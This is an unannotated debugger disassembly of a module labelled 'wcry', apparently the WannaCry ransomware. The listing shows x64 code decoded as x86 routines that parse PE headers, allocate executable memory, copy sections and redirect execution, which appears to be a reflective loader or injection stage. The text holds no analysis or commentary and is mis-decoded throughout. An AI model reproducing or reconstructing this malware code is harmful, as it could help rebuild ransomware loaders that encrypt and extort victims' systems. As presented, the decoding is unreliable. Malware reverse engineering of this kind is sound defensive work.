00402477        74 36                   JE SHORT wcry.004024AF
00402479        48                      DEC EAX
0040247A        89D1                    MOV ECX,EDX
0040247C        48                      DEC EAX
0040247D        83C1 00                 ADD ECX,0
00402480        48                      DEC EAX
00402481        31FF                    XOR EDI,EDI
00402483        8B39                    MOV EDI,DWORD PTR DS:[ECX]
00402485        48                      DEC EAX
00402486        85FF                    TEST EDI,EDI
00402488        74 25                   JE SHORT wcry.004024AF
0040248A        48                      DEC EAX
0040248B        8B4D 20                 MOV ECX,DWORD PTR SS:[EBP+20]
0040248E        49                      DEC ECX
0040248F        89C8                    MOV EAX,ECX
00402491        48                      DEC EAX
00402492        01F9                    ADD ECX,EDI
00402494        48                      DEC EAX
00402495        894D 78                 MOV DWORD PTR SS:[EBP+78],ECX
00402498        48                      DEC EAX
00402499        31D2                    XOR EDX,EDX
0040249B        BF 0C000000             MOV EDI,0C
004024A0        F7F7                    DIV EDI
004024A2        89C2                    MOV EDX,EAX
004024A4        48                      DEC EAX
004024A5        83EC 20                 SUB ESP,20
004024A8        FF56 38                 CALL DWORD PTR DS:[ESI+38]
004024AB        48                      DEC EAX
004024AC        83C4 20                 ADD ESP,20
004024AF        48                      DEC EAX
004024B0        31C0                    XOR EAX,EAX
004024B2        59                      POP ECX
004024B3        5B                      POP EBX
004024B4        5A                      POP EDX
004024B5        5F                      POP EDI
004024B6        C3                      RETN
004024B7        57                      PUSH EDI
004024B8        52                      PUSH EDX
004024B9        53                      PUSH EBX
004024BA        51                      PUSH ECX
004024BB        48                      DEC EAX
004024BC        8B7D 08                 MOV EDI,DWORD PTR SS:[EBP+8]
004024BF        48                      DEC EAX
004024C0        83C7 06                 ADD EDI,6
004024C3        48                      DEC EAX
004024C4        31DB                    XOR EBX,EBX
004024C6        66:8B1F                 MOV BX,WORD PTR DS:[EDI]
004024C9        48                      DEC EAX
004024CA        31D2                    XOR EDX,EDX
004024CC        48                      DEC EAX
004024CD        39D3                    CMP EBX,EDX
004024CF        0F84 E6000000           JE wcry.004025BB
004024D5        48                      DEC EAX
004024D6        B8 28000000             MOV EAX,28
004024DB        0000                    ADD BYTE PTR DS:[EAX],AL
004024DD        0000                    ADD BYTE PTR DS:[EAX],AL
004024DF        52                      PUSH EDX
004024E0        48                      DEC EAX
004024E1        F7E2                    MUL EDX
004024E3        5A                      POP EDX
004024E4        48                      DEC EAX
004024E5        0345 10                 ADD EAX,DWORD PTR SS:[EBP+10]
004024E8        49                      DEC ECX
004024E9        89C2                    MOV EDX,EAX
004024EB        49                      DEC ECX
004024EC        83C2 24                 ADD EDX,24
004024EF        48                      DEC EAX
004024F0        31FF                    XOR EDI,EDI
004024F2        41                      INC ECX
004024F3        8B3A                    MOV EDI,DWORD PTR DS:[EDX]
004024F5        C785 A6000000 00000000  MOV DWORD PTR SS:[EBP+A6],0
004024FF        48                      DEC EAX
00402500        F7C7 00000002           TEST EDI,2000000
00402506        0F85 9F000000           JNZ wcry.004025AB
0040250C        48                      DEC EAX
0040250D        F7C7 00000040           TEST EDI,40000000
00402513        74 0A                   JE SHORT wcry.0040251F
00402515        C785 A6000000 02000000  MOV DWORD PTR SS:[EBP+A6],2
0040251F        49                      DEC ECX
00402520        BA 00000080             MOV EDX,80000000
00402525        0000                    ADD BYTE PTR DS:[EAX],AL
00402527        0000                    ADD BYTE PTR DS:[EAX],AL
00402529        4C                      DEC ESP
0040252A        85D7                    TEST EDI,EDX
0040252C        74 0A                   JE SHORT wcry.00402538
0040252E        C785 A6000000 04000000  MOV DWORD PTR SS:[EBP+A6],4
00402538        48                      DEC EAX
00402539        F7C7 00000020           TEST EDI,20000000
0040253F        74 26                   JE SHORT wcry.00402567
00402541        83BD A6000000 02        CMP DWORD PTR SS:[EBP+A6],2
00402548        75 0A                   JNZ SHORT wcry.00402554
0040254A        C785 A6000000 20000000  MOV DWORD PTR SS:[EBP+A6],20
00402554        83BD A6000000 04        CMP DWORD PTR SS:[EBP+A6],4
0040255B        75 0A                   JNZ SHORT wcry.00402567
0040255D        C785 A6000000 40000000  MOV DWORD PTR SS:[EBP+A6],40
00402567        48                      DEC EAX
00402568        8B7D 20                 MOV EDI,DWORD PTR SS:[EBP+20]
0040256B        48                      DEC EAX
0040256C        89C1                    MOV ECX,EAX
0040256E        48                      DEC EAX
0040256F        83C1 0C                 ADD ECX,0C
00402572        4D                      DEC EBP
00402573        31D2                    XOR EDX,EDX
00402575        44                      INC ESP
00402576        8B11                    MOV EDX,DWORD PTR DS:[ECX]
00402578        4C                      DEC ESP
00402579        01D7                    ADD EDI,EDX
0040257B        49                      DEC ECX
0040257C        89C2                    MOV EDX,EAX
0040257E        49                      DEC ECX
0040257F        83C2 08                 ADD EDX,8
00402582        41                      INC ECX
00402583        8B0A                    MOV ECX,DWORD PTR DS:[EDX]
00402585        52                      PUSH EDX
00402586        4C                      DEC ESP
00402587        8D8D AA000000           LEA ECX,DWORD PTR SS:[EBP+AA]
0040258D        4C                      DEC ESP
0040258E        8B85 A6000000           MOV EAX,DWORD PTR SS:[EBP+A6]
00402594        48                      DEC EAX
00402595        89CA                    MOV EDX,ECX
00402597        48                      DEC EAX
00402598        89F9                    MOV ECX,EDI
0040259A        48                      DEC EAX
0040259B        83EC 20                 SUB ESP,20
0040259E        FF56 30                 CALL DWORD PTR DS:[ESI+30]
004025A1        48                      DEC EAX
004025A2        83C4 20                 ADD ESP,20
004025A5        5A                      POP EDX
004025A6        48                      DEC EAX
004025A7        85C0                    TEST EAX,EAX
004025A9        74 08                   JE SHORT wcry.004025B3
004025AB        48                      DEC EAX
004025AC        FFC2                    INC EDX
004025AE      ^ E9 19FFFFFF             JMP wcry.004024CC
004025B3        48                      DEC EAX
004025B4        31C0                    XOR EAX,EAX
004025B6        48                      DEC EAX
004025B7        F7D0                    NOT EAX
004025B9        EB 03                   JMP SHORT wcry.004025BE
004025BB        48                      DEC EAX
004025BC        31C0                    XOR EAX,EAX
004025BE        59                      POP ECX
004025BF        5B                      POP EBX
004025C0        5A                      POP EDX
004025C1        5F                      POP EDI
004025C2        C3                      RETN
004025C3        52                      PUSH EDX
004025C4        57                      PUSH EDI
004025C5        48                      DEC EAX
004025C6        BA 00000000             MOV EDX,0
004025CB        0000                    ADD BYTE PTR DS:[EAX],AL
004025CD        0000                    ADD BYTE PTR DS:[EAX],AL
004025CF        EB 0C                   JMP SHORT wcry.004025DD
004025D1        52                      PUSH EDX
004025D2        57                      PUSH EDI
004025D3        48                      DEC EAX
004025D4        BA 01000000             MOV EDX,1
004025D9        0000                    ADD BYTE PTR DS:[EAX],AL
004025DB        0000                    ADD BYTE PTR DS:[EAX],AL
004025DD        48                      DEC EAX
004025DE        8B45 20                 MOV EAX,DWORD PTR SS:[EBP+20]
004025E1        4C                      DEC ESP
004025E2        8B55 08                 MOV EDX,DWORD PTR SS:[EBP+8]
004025E5        49                      DEC ECX
004025E6        83C2 28                 ADD EDX,28
004025E9        48                      DEC EAX
004025EA        31FF                    XOR EDI,EDI
004025EC        41                      INC ECX
004025ED        8B3A                    MOV EDI,DWORD PTR DS:[EDX]
004025EF        48                      DEC EAX
004025F0        01F8                    ADD EAX,EDI
004025F2        49                      DEC ECX
004025F3        B8 00000000             MOV EAX,0
004025F8        0000                    ADD BYTE PTR DS:[EAX],AL
004025FA        0000                    ADD BYTE PTR DS:[EAX],AL
004025FC        48                      DEC EAX
004025FD        8B4D 20                 MOV ECX,DWORD PTR SS:[EBP+20]
00402600        48                      DEC EAX
00402601        83EC 20                 SUB ESP,20
00402604        FFD0                    CALL EAX
00402606        48                      DEC EAX
00402607        83C4 20                 ADD ESP,20
0040260A        48                      DEC EAX
0040260B        31C0                    XOR EAX,EAX
0040260D        5F                      POP EDI
0040260E        5A                      POP EDX
0040260F        C3                      RETN
00402610        48                      DEC EAX
00402611        39EC                    CMP ESP,EBP
00402613        0F8D AA000000           JGE wcry.004026C3
00402619        57                      PUSH EDI
0040261A        56                      PUSH ESI
0040261B        53                      PUSH EBX
0040261C        48                      DEC EAX
0040261D        89E6                    MOV ESI,ESP
0040261F        48                      DEC EAX
00402620        83C6 0C                 ADD ESI,0C
00402623        55                      PUSH EBP
00402624        6A 00                   PUSH 0
00402626        48                      DEC EAX
00402627        89E3                    MOV EBX,ESP
00402629        51                      PUSH ECX
0040262A        52                      PUSH EDX
0040262B        48                      DEC EAX
0040262C        89E9                    MOV ECX,EBP
0040262E        48                      DEC EAX
0040262F        29F1                    SUB ECX,ESI
00402631        48                      DEC EAX
00402632        83F9 08                 CMP ECX,8
00402635        0F8C 81000000           JL wcry.004026BC
0040263B        50                      PUSH EAX
0040263C        52                      PUSH EDX
0040263D        53                      PUSH EBX
0040263E        48                      DEC EAX
0040263F        B8 0F000000             MOV EAX,0F
00402644        0000                    ADD BYTE PTR DS:[EAX],AL
00402646        0000                    ADD BYTE PTR DS:[EAX],AL
00402648        48                      DEC EAX
00402649        6BC0 08                 IMUL EAX,EAX,8
0040264C        48                      DEC EAX
0040264D        39C8                    CMP EAX,ECX
0040264F        7D 03                   JGE SHORT wcry.00402654
00402651        48                      DEC EAX
00402652        89C1                    MOV ECX,EAX
00402654        48                      DEC EAX
00402655        BA 00000000             MOV EDX,0
0040265A        0000                    ADD BYTE PTR DS:[EAX],AL
0040265C        0000                    ADD BYTE PTR DS:[EAX],AL
0040265E        48                      DEC EAX
0040265F        89C8                    MOV EAX,ECX
00402661        48                      DEC EAX
00402662        BB 08000000             MOV EBX,8
00402667        0000                    ADD BYTE PTR DS:[EAX],AL
00402669        0000                    ADD BYTE PTR DS:[EAX],AL
0040266B        48                      DEC EAX
0040266C        F7FB                    IDIV EBX
0040266E        48                      DEC EAX
0040266F        FFC8                    DEC EAX
00402671        6A 00                   PUSH 0
00402673        48                      DEC EAX
00402674        83F8 00                 CMP EAX,0
00402677      ^ 75 F5                   JNZ SHORT wcry.0040266E
00402679        48                      DEC EAX
0040267A        01CC                    ADD ESP,ECX
0040267C        5B                      POP EBX
0040267D        5A                      POP EDX
0040267E        58                      POP EAX
0040267F        48                      DEC EAX
00402680        89E5                    MOV EBP,ESP
00402682        48                      DEC EAX
00402683        89E7                    MOV EDI,ESP
00402685        48                      DEC EAX
00402686        29CF                    SUB EDI,ECX
00402688        48                      DEC EAX
00402689        89FC                    MOV ESP,EDI
0040268B        F3:A4                   REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
0040268D        48                      DEC EAX
0040268E        8923                    MOV DWORD PTR DS:[EBX],ESP
00402690        48                      DEC EAX
00402691        8B4B F8                 MOV ECX,DWORD PTR DS:[EBX-8]
00402694        48                      DEC EAX
00402695        8B53 F0                 MOV EDX,DWORD PTR DS:[EBX-10]
00402698        48                      DEC EAX
00402699        C743 F8 00000000        MOV DWORD PTR DS:[EBX-8],0
004026A0        48                      DEC EAX
004026A1        C743 F0 00000000        MOV DWORD PTR DS:[EBX-10],0
004026A8        48                      DEC EAX
004026A9        C70424 FFFFFFFF         MOV DWORD PTR SS:[ESP],-1
004026B0        48                      DEC EAX
004026B1        BE EEEEEEEE             MOV ESI,EEEEEEEE
004026B6        EE                      OUT DX,AL                                           ;  I/O 命令
004026B7        EE                      OUT DX,AL                                           ;  I/O 命令
004026B8        EE                      OUT DX,AL                                           ;  I/O 命令
004026B9        EE                      OUT DX,AL                                           ;  I/O 命令
004026BA        FFE0                    JMP EAX
004026BC        59                      POP ECX
004026BD        59                      POP ECX
004026BE        5D                      POP EBP
004026BF        5D                      POP EBP
004026C0        5B                      POP EBX
004026C1        5E                      POP ESI
004026C2        5F                      POP EDI
004026C3        FFE0                    JMP EAX
004026C5        48                      DEC EAX
004026C6        89E1                    MOV ECX,ESP
004026C8        48                      DEC EAX
004026C9        2B4D 08                 SUB ECX,DWORD PTR SS:[EBP+8]
004026CC        48                      DEC EAX
004026CD        83E9 04                 SUB ECX,4
004026D0        48                      DEC EAX
004026D1        89EC                    MOV ESP,EBP
004026D3        48                      DEC EAX
004026D4        83C4 0C                 ADD ESP,0C
004026D7        5D                      POP EBP
004026D8        5B                      POP EBX
004026D9        5E                      POP ESI
004026DA        5F                      POP EDI
004026DB        5A                      POP EDX
004026DC        48                      DEC EAX
004026DD        01CC                    ADD ESP,ECX
004026DF        FFE2                    JMP EDX
004026E1        0000                    ADD BYTE PTR DS:[EAX],AL
004026E3        0000                    ADD BYTE PTR DS:[EAX],AL
004026E5        57                      PUSH EDI
004026E6        52                      PUSH EDX
004026E7        53                      PUSH EBX
004026E8        51                      PUSH ECX
004026E9        48                      DEC EAX
004026EA        B8 08000000             MOV EAX,8
004026EF        0000                    ADD BYTE PTR DS:[EAX],AL
004026F1        0000                    ADD BYTE PTR DS:[EAX],AL
004026F3        48                      DEC EAX
004026F4        BA 0C000000             MOV EDX,0C
004026F9        0000                    ADD BYTE PTR DS:[EAX],AL
004026FB        0000                    ADD BYTE PTR DS:[EAX],AL
004026FD        48                      DEC EAX
004026FE        F7E2                    MUL EDX
00402700        48                      DEC EAX
00402701        8B55 18                 MOV EDX,DWORD PTR SS:[EBP+18]
00402704        48                      DEC EAX
00402705        01C2                    ADD EDX,EAX
00402707        48                      DEC EAX
00402708        83C2 04                 ADD EDX,4
0040270B        48                      DEC EAX
0040270C        31DB                    XOR EBX,EBX
0040270E        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
00402710        48                      DEC EAX
00402711        C1EB 02                 SHR EBX,2
00402714        48                      DEC EAX
00402715        B8 0F000000             MOV EAX,0F
0040271A        0000                    ADD BYTE PTR DS:[EAX],AL
0040271C        0000                    ADD BYTE PTR DS:[EAX],AL
0040271E        48                      DEC EAX
0040271F        F7E3                    MUL EBX
00402721        48                      DEC EAX
00402722        8945 68                 MOV DWORD PTR SS:[EBP+68],EAX
00402725        49                      DEC ECX
00402726        B9 40000000             MOV ECX,40
0040272B        0000                    ADD BYTE PTR DS:[EAX],AL
0040272D        0000                    ADD BYTE PTR DS:[EAX],AL
0040272F        49                      DEC ECX
00402730        B8 00300000             MOV EAX,3000
00402735        0000                    ADD BYTE PTR DS:[EAX],AL
00402737        0000                    ADD BYTE PTR DS:[EAX],AL
00402739        48                      DEC EAX
0040273A        89C2                    MOV EDX,EAX
0040273C        48                      DEC EAX
0040273D        31C9                    XOR ECX,ECX
0040273F        48                      DEC EAX
00402740        83EC 20                 SUB ESP,20
00402743        FF56 08                 CALL DWORD PTR DS:[ESI+8]
00402746        48                      DEC EAX
00402747        83C4 20                 ADD ESP,20
0040274A        48                      DEC EAX
0040274B        85C0                    TEST EAX,EAX
0040274D        74 7C                   JE SHORT wcry.004027CB
0040274F        48                      DEC EAX
00402750        8945 60                 MOV DWORD PTR SS:[EBP+60],EAX
00402753        48                      DEC EAX
00402754        8B46 58                 MOV EAX,DWORD PTR DS:[ESI+58]
00402757        48                      DEC EAX
00402758        8BBD AE000000           MOV EDI,DWORD PTR SS:[EBP+AE]
0040275E        48                      DEC EAX
0040275F        83C7 03                 ADD EDI,3
00402762        48                      DEC EAX
00402763        8907                    MOV DWORD PTR DS:[EDI],EAX
00402765        48                      DEC EAX
00402766        8B46 68                 MOV EAX,DWORD PTR DS:[ESI+68]
00402769        48                      DEC EAX
0040276A        A9 00000000             TEST EAX,0
0040276F        74 2E                   JE SHORT wcry.0040279F
00402771        48                      DEC EAX
00402772        8B85 BE000000           MOV EAX,DWORD PTR SS:[EBP+BE]
00402778        48                      DEC EAX
00402779        8B9D C6000000           MOV EBX,DWORD PTR SS:[EBP+C6]
0040277F        48                      DEC EAX
00402780        8903                    MOV DWORD PTR DS:[EBX],EAX
00402782        48                      DEC EAX
00402783        8B5E 60                 MOV EBX,DWORD PTR DS:[ESI+60]
00402786        48                      DEC EAX
00402787        8BBD C6000000           MOV EDI,DWORD PTR SS:[EBP+C6]
0040278D        48                      DEC EAX
0040278E        29DF                    SUB EDI,EBX
00402790        48                      DEC EAX
00402791        8B9D B6000000           MOV EBX,DWORD PTR SS:[EBP+B6]
00402797        48                      DEC EAX
00402798        FFC3                    INC EBX
0040279A        48                      DEC EAX
0040279B        893B                    MOV DWORD PTR DS:[EBX],EDI
0040279D        EB 14                   JMP SHORT wcry.004027B3
0040279F        48                      DEC EAX
004027A0        8B85 BE000000           MOV EAX,DWORD PTR SS:[EBP+BE]
004027A6        48                      DEC EAX
004027A7        8BBD B6000000           MOV EDI,DWORD PTR SS:[EBP+B6]
004027AD        48                      DEC EAX
004027AE        FFC7                    INC EDI
004027B0        48                      DEC EAX
004027B1        8907                    MOV DWORD PTR DS:[EDI],EAX
004027B3        48                      DEC EAX
004027B4        8B46 68                 MOV EAX,DWORD PTR DS:[ESI+68]
004027B7        48                      DEC EAX
004027B8        A9 01000000             TEST EAX,1
004027BD        74 14                   JE SHORT wcry.004027D3
004027BF        48                      DEC EAX
004027C0        8BBD B6000000           MOV EDI,DWORD PTR SS:[EBP+B6]
004027C6        C607 BF                 MOV BYTE PTR DS:[EDI],0BF
004027C9        EB 08                   JMP SHORT wcry.004027D3
004027CB        48                      DEC EAX
004027CC        31C0                    XOR EAX,EAX
004027CE        48                      DEC EAX
004027CF        F7D0                    NOT EAX
004027D1        EB 03                   JMP SHORT wcry.004027D6
004027D3        48                      DEC EAX
004027D4        31C0                    XOR EAX,EAX
004027D6        59                      POP ECX
004027D7        5B                      POP EBX
004027D8        5A                      POP EDX
004027D9        5F                      POP EDI
004027DA        C3                      RETN
004027DB        57                      PUSH EDI
004027DC        52                      PUSH EDX
004027DD        53                      PUSH EBX
004027DE        51                      PUSH ECX
004027DF        56                      PUSH ESI
004027E0        50                      PUSH EAX
004027E1        48                      DEC EAX
004027E2        8B7D 60                 MOV EDI,DWORD PTR SS:[EBP+60]
004027E5        48                      DEC EAX
004027E6        8B45 70                 MOV EAX,DWORD PTR SS:[EBP+70]
004027E9        48                      DEC EAX
004027EA        01C7                    ADD EDI,EAX
004027EC        48                      DEC EAX
004027ED        89EE                    MOV ESI,EBP
004027EF        48                      DEC EAX
004027F0        81C6 80000000           ADD ESI,80
004027F6        48                      DEC EAX
004027F7        B9 0F000000             MOV ECX,0F
004027FC        0000                    ADD BYTE PTR DS:[EAX],AL
004027FE        0000                    ADD BYTE PTR DS:[EAX],AL
00402800        F3:A4                   REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
00402802        48                      DEC EAX
00402803        8B7D 60                 MOV EDI,DWORD PTR SS:[EBP+60]
00402806        48                      DEC EAX
00402807        8B45 70                 MOV EAX,DWORD PTR SS:[EBP+70]
0040280A        48                      DEC EAX
0040280B        01C7                    ADD EDI,EAX
0040280D        48                      DEC EAX
0040280E        83C7 00                 ADD EDI,0
00402811        48                      DEC EAX
00402812        FFC7                    INC EDI
00402814        48                      DEC EAX
00402815        8B55 40                 MOV EDX,DWORD PTR SS:[EBP+40]
00402818        48                      DEC EAX
00402819        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
0040281B        48                      DEC EAX
0040281C        891F                    MOV DWORD PTR DS:[EDI],EBX
0040281E        48                      DEC EAX
0040281F        8BB5 CE000000           MOV ESI,DWORD PTR SS:[EBP+CE]
00402825        48                      DEC EAX
00402826        8B7D 60                 MOV EDI,DWORD PTR SS:[EBP+60]
00402829        48                      DEC EAX
0040282A        8B45 70                 MOV EAX,DWORD PTR SS:[EBP+70]
0040282D        48                      DEC EAX
0040282E        01C7                    ADD EDI,EAX
00402830        48                      DEC EAX
00402831        83C7 0A                 ADD EDI,0A
00402834        48                      DEC EAX
00402835        FFC7                    INC EDI
00402837        48                      DEC EAX
00402838        83C7 08                 ADD EDI,8
0040283B        48                      DEC EAX
0040283C        29FE                    SUB ESI,EDI
0040283E        48                      DEC EAX
0040283F        8B7D 60                 MOV EDI,DWORD PTR SS:[EBP+60]
00402842        48                      DEC EAX
00402843        8B45 70                 MOV EAX,DWORD PTR SS:[EBP+70]
00402846        48                      DEC EAX
00402847        01C7                    ADD EDI,EAX
00402849        48                      DEC EAX
0040284A        83C7 0A                 ADD EDI,0A
0040284D        48                      DEC EAX
0040284E        FFC7                    INC EDI
00402850        48                      DEC EAX
00402851        8937                    MOV DWORD PTR DS:[EDI],ESI
00402853        48                      DEC EAX
00402854        8B7D 60                 MOV EDI,DWORD PTR SS:[EBP+60]
00402857        48                      DEC EAX
00402858        8B45 70                 MOV EAX,DWORD PTR SS:[EBP+70]
0040285B        48                      DEC EAX
0040285C        01C7                    ADD EDI,EAX
0040285E        48                      DEC EAX
0040285F        8B75 40                 MOV ESI,DWORD PTR SS:[EBP+40]
00402862        48                      DEC EAX
00402863        893E                    MOV DWORD PTR DS:[ESI],EDI
00402865        48                      DEC EAX
00402866        8B45 70                 MOV EAX,DWORD PTR SS:[EBP+70]
00402869        48                      DEC EAX
0040286A        83C0 0F                 ADD EAX,0F
0040286D        48                      DEC EAX
0040286E        8945 70                 MOV DWORD PTR SS:[EBP+70],EAX
00402871        58                      POP EAX
00402872        5E                      POP ESI
00402873        59                      POP ECX
00402874        5B                      POP EBX
00402875        5A                      POP EDX
00402876        5F                      POP EDI
00402877        C3                      RETN
00402878        57                      PUSH EDI
00402879        52                      PUSH EDX
0040287A        53                      PUSH EBX
0040287B        51                      PUSH ECX
0040287C        56                      PUSH ESI
0040287D        EB 4D                   JMP SHORT wcry.004028CC
0040287F        48                      DEC EAX
00402880        8B7D 00                 MOV EDI,DWORD PTR SS:[EBP]
00402883        48                      DEC EAX
00402884        89DA                    MOV EDX,EBX
00402886        48                      DEC EAX
00402887        83C2 0C                 ADD EDX,0C
0040288A        48                      DEC EAX
0040288B        033A                    ADD EDI,DWORD PTR DS:[EDX]
0040288D        48                      DEC EAX
0040288E        89E9                    MOV ECX,EBP
00402890        48                      DEC EAX
00402891        81C1 8F000000           ADD ECX,8F
00402897        48                      DEC EAX
00402898        89FA                    MOV EDX,EDI
0040289A        48                      DEC EAX
0040289B        83EC 20                 SUB ESP,20
0040289E        FF56 28                 CALL DWORD PTR DS:[ESI+28]
004028A1        48                      DEC EAX
004028A2        83C4 20                 ADD ESP,20
004028A5        48                      DEC EAX
004028A6        85C0                    TEST EAX,EAX
004028A8        74 22                   JE SHORT wcry.004028CC
004028AA        48                      DEC EAX
004028AB        89E9                    MOV ECX,EBP
004028AD        48                      DEC EAX
004028AE        81C1 9A000000           ADD ECX,9A
004028B4        48                      DEC EAX
004028B5        89FA                    MOV EDX,EDI
004028B7        48                      DEC EAX
004028B8        83EC 20                 SUB ESP,20
004028BB        FF56 28                 CALL DWORD PTR DS:[ESI+28]
004028BE        48                      DEC EAX
004028BF        83C4 20                 ADD ESP,20
004028C2        48                      DEC EAX
004028C3        85C0                    TEST EAX,EAX
004028C5        74 05                   JE SHORT wcry.004028CC
004028C7        48                      DEC EAX
004028C8        31C0                    XOR EAX,EAX
004028CA        EB 0C                   JMP SHORT wcry.004028D8
004028CC        48                      DEC EAX
004028CD        B8 01000000             MOV EAX,1
004028D2        0000                    ADD BYTE PTR DS:[EAX],AL
004028D4        0000                    ADD BYTE PTR DS:[EAX],AL
004028D6        EB 00                   JMP SHORT wcry.004028D8
004028D8        5E                      POP ESI
004028D9        59                      POP ECX
004028DA        5B                      POP EBX
004028DB        5A                      POP EDX
004028DC        5F                      POP EDI
004028DD        C3                      RETN
004028DE        57                      PUSH EDI
004028DF        52                      PUSH EDX
004028E0        53                      PUSH EBX
004028E1        51                      PUSH ECX
004028E2        56                      PUSH ESI
004028E3        48                      DEC EAX
004028E4        8B7D 48                 MOV EDI,DWORD PTR SS:[EBP+48]
004028E7        48                      DEC EAX
004028E8        89FA                    MOV EDX,EDI
004028EA        48                      DEC EAX
004028EB        83C2 00                 ADD EDX,0
004028EE        66:8B1A                 MOV BX,WORD PTR DS:[EDX]
004028F1        66:81FB 4D5A            CMP BX,5A4D
004028F6        0F85 9B000000           JNZ wcry.00402997
004028FC        48                      DEC EAX
004028FD        89FA                    MOV EDX,EDI
004028FF        48                      DEC EAX
00402900        83C2 3C                 ADD EDX,3C
00402903        48                      DEC EAX
00402904        31DB                    XOR EBX,EBX
00402906        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
00402908        48                      DEC EAX
00402909        01DF                    ADD EDI,EBX
0040290B        48                      DEC EAX
0040290C        89FA                    MOV EDX,EDI
0040290E        48                      DEC EAX
0040290F        83C2 00                 ADD EDX,0
00402912        48                      DEC EAX
00402913        31DB                    XOR EBX,EBX
00402915        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
00402917        48                      DEC EAX
00402918        81FB 50450000           CMP EBX,4550
0040291E        75 77                   JNZ SHORT wcry.00402997
00402920        48                      DEC EAX
00402921        89FE                    MOV ESI,EDI
00402923        48                      DEC EAX
00402924        83C6 14                 ADD ESI,14
00402927        48                      DEC EAX
00402928        31DB                    XOR EBX,EBX
0040292A        66:8B1E                 MOV BX,WORD PTR DS:[ESI]
0040292D        48                      DEC EAX
0040292E        89FE                    MOV ESI,EDI
00402930        48                      DEC EAX
00402931        83C6 18                 ADD ESI,18
00402934        48                      DEC EAX
00402935        01DE                    ADD ESI,EBX
00402937        48                      DEC EAX
00402938        89FB                    MOV EBX,EDI
0040293A        48                      DEC EAX
0040293B        83C3 06                 ADD EBX,6
0040293E        48                      DEC EAX
0040293F        31C9                    XOR ECX,ECX
00402941        66:8B0B                 MOV CX,WORD PTR DS:[EBX]
00402944        48                      DEC EAX
00402945        31D2                    XOR EDX,EDX
00402947        48                      DEC EAX
00402948        89F3                    MOV EBX,ESI
0040294A        48                      DEC EAX
0040294B        83C3 0C                 ADD EBX,0C
0040294E        48                      DEC EAX
0040294F        8B7D 48                 MOV EDI,DWORD PTR SS:[EBP+48]
00402952        4D                      DEC EBP
00402953        31D2                    XOR EDX,EDX
00402955        44                      INC ESP
00402956        8B13                    MOV EDX,DWORD PTR DS:[EBX]
00402958        4C                      DEC ESP
00402959        01D7                    ADD EDI,EDX
0040295B        48                      DEC EAX
0040295C        39F8                    CMP EAX,EDI
0040295E        7C 2B                   JL SHORT wcry.0040298B
00402960        48                      DEC EAX
00402961        89F3                    MOV EBX,ESI
00402963        48                      DEC EAX
00402964        83C3 08                 ADD EBX,8
00402967        4D                      DEC EBP
00402968        31D2                    XOR EDX,EDX
0040296A        44                      INC ESP
0040296B        8B13                    MOV EDX,DWORD PTR DS:[EBX]
0040296D        4C                      DEC ESP
0040296E        01D7                    ADD EDI,EDX
00402970        48                      DEC EAX
00402971        39F8                    CMP EAX,EDI
00402973        7D 16                   JGE SHORT wcry.0040298B
00402975        49                      DEC ECX
00402976        89F2                    MOV EDX,ESI
00402978        49                      DEC ECX
00402979        83C2 24                 ADD EDX,24
0040297C        48                      DEC EAX
0040297D        31DB                    XOR EBX,EBX
0040297F        41                      INC ECX
00402980        8B1A                    MOV EBX,DWORD PTR DS:[EDX]
00402982        48                      DEC EAX
00402983        F7C3 00000020           TEST EBX,20000000
00402989        75 11                   JNZ SHORT wcry.0040299C
0040298B        48                      DEC EAX
0040298C        83C6 28                 ADD ESI,28
0040298F        48                      DEC EAX
00402990        FFC2                    INC EDX
00402992        48                      DEC EAX
00402993        39CA                    CMP EDX,ECX
00402995      ^ 7C B0                   JL SHORT wcry.00402947
00402997        48                      DEC EAX
00402998        31C0                    XOR EAX,EAX
0040299A        EB 0C                   JMP SHORT wcry.004029A8
0040299C        48                      DEC EAX
0040299D        B8 01000000             MOV EAX,1
004029A2        0000                    ADD BYTE PTR DS:[EAX],AL
004029A4        0000                    ADD BYTE PTR DS:[EAX],AL
004029A6        EB 00                   JMP SHORT wcry.004029A8
004029A8        5E                      POP ESI
004029A9        59                      POP ECX
004029AA        5B                      POP EBX
004029AB        5A                      POP EDX
004029AC        5F                      POP EDI
004029AD        C3                      RETN
004029AE        EB 4D                   JMP SHORT wcry.004029FD
004029B0        90                      NOP
004029B1        90                      NOP
004029B2        90                      NOP
004029B3        90                      NOP
004029B4        90                      NOP
004029B5        90                      NOP
004029B6        0000                    ADD BYTE PTR DS:[EAX],AL
004029B8        0000                    ADD BYTE PTR DS:[EAX],AL
004029BA        0000                    ADD BYTE PTR DS:[EAX],AL
004029BC        0000                    ADD BYTE PTR DS:[EAX],AL
004029BE        0000                    ADD BYTE PTR DS:[EAX],AL
004029C0        0000                    ADD BYTE PTR DS:[EAX],AL
004029C2        0000                    ADD BYTE PTR DS:[EAX],AL
004029C4        0000                    ADD BYTE PTR DS:[EAX],AL
004029C6        0000                    ADD BYTE PTR DS:[EAX],AL
004029C8        0000                    ADD BYTE PTR DS:[EAX],AL
004029CA        0000                    ADD BYTE PTR DS:[EAX],AL
004029CC        0000                    ADD BYTE PTR DS:[EAX],AL
004029CE        1E                      PUSH DS
004029CF        0000                    ADD BYTE PTR DS:[EAX],AL
004029D1        0021                    ADD BYTE PTR DS:[ECX],AH
004029D3        0D 00004E0D             OR EAX,0D4E0000
004029D8        0000                    ADD BYTE PTR DS:[EAX],AL
004029DA        0009                    ADD BYTE PTR DS:[ECX],CL
004029DC        0000                    ADD BYTE PTR DS:[EAX],AL
004029DE        005E 0D                 ADD BYTE PTR DS:[ESI+D],BL
004029E1        0000                    ADD BYTE PTR DS:[EAX],AL
004029E3        0000                    ADD BYTE PTR DS:[EAX],AL
004029E5        0000                    ADD BYTE PTR DS:[EAX],AL
004029E7        0000                    ADD BYTE PTR DS:[EAX],AL
004029E9        0000                    ADD BYTE PTR DS:[EAX],AL
004029EB        E8 00000000             CALL wcry.004029F0
004029F0        58                      POP EAX
004029F1        48                      DEC EAX
004029F2        8B60 C6                 MOV ESP,DWORD PTR DS:[EAX-3A]
004029F5        48                      DEC EAX
004029F6        8B68 CE                 MOV EBP,DWORD PTR DS:[EAX-32]
004029F9        48                      DEC EAX
004029FA        8B70 D6                 MOV ESI,DWORD PTR DS:[EAX-2A]
